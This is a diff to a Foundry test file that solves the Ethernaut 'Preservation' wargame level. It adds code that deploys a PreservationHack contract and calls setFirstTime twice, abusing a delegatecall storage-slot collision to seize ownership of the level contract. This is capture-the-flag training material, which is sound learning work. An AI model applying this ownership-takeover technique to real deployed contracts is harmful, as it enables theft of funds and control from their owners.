@@ -4,6 +4,8 @@ import "ds-test/test.sol";
 import "../Preservation/PreservationFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
+import "../Preservation/PreservationHack.sol";
+import "forge-std/console.sol";
 
 contract PreservationTest is DSTest {
     Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
@@ -28,6 +30,11 @@ contract PreservationTest is DSTest {
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+
+        PreservationHack attackerContract = new PreservationHack();
+        uint256 time = uint256(uint160(address(attackerContract)));
+        ethernautPreservation.setFirstTime(time);
+        ethernautPreservation.setFirstTime(uint256(uint160(msg.sender)));
 
 
         //////////////////////
